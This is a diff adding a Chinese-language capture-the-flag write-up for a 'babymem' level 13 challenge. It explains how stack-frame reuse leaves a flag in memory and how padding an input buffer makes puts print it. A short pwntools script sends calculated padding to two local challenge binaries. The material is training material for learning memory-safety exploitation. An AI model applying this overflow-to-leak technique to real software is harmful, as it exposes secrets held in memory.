@@ -887,5 +887,34 @@ exit()
 
 ## level 13
 
+这一关在challenge之前，有一个verfiy函数，他会读取flag的内容到栈空间中。 在调用verfiy函数返回后才调用challenge函数，又碰巧challenge函数的栈空间大于verfiy的栈空间。所以challenge函数的栈空间中包含有verfiy的栈空间。也就是包含了verfiy之前读取到的flag内容。
+
+又又又恰巧，读取标准输入缓冲区的buffer恰好在verfiy读取flag的内容之前，所以，只要恰好将缓冲区溢出到flag的位置，后续`puts`函数就会将flag的内容打印出来。
+
+至于如何计算溢出的字节数，就反编译看一下栈空间，计算一下buffer到flag的字节数就行。
+
+
+```python
+from pwn import *
+
+elf = ELF("/challenge/babymem_level13.1")
+p = process("/challenge/babymem_level13.1")
+
+buffer_size = 0x1B
+p.sendline(f"{buffer_size}")
+p.send(buffer_size * b'A')
+p.interactive()
+
+elf = ELF("/challenge/babymem_level13.0")
+p = process("/challenge/babymem_level13.0")
+
+buffer_size = 0x37
+p.sendline(f"{buffer_size}")
+p.send(buffer_size * b'A')
+p.interactive()
+```
+
 
 ## level 14
+
+## level 15
